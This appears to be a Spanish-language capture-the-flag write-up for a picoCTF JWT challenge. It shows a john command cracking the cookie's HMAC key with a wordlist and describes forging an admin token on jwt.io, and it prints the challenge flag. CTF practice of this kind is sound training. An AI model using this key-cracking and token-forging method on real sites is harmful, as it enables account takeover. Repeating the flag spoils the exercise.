Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

Hints:
1.-What is that cookie?
2.-Have you heard of JWT?
### Solución

```
El sitio web genera una cookie la cual vamos a tratar de modificar el usuario por admin, sin embargo ocupamos una llave para firmar el token de la cookie firmada y funcione, de otro modo el server no funcionaria, con ayuda de un archivo de contraseñas basicas y fuerza bruta utilizamos john para crackear la cookie dandonos de contraseña ilovepico:
(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:17 DONE (2025-03-30 22:15) 0.05810g/s 429711p/s 429711c/s 429711C/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

con jwt.io modificamos el token ya con la firma y la suplantamos por la otra recargamos y ya estaria la flag

picoCTF{jawt_was_just_what_you_thought_44c752f5}
```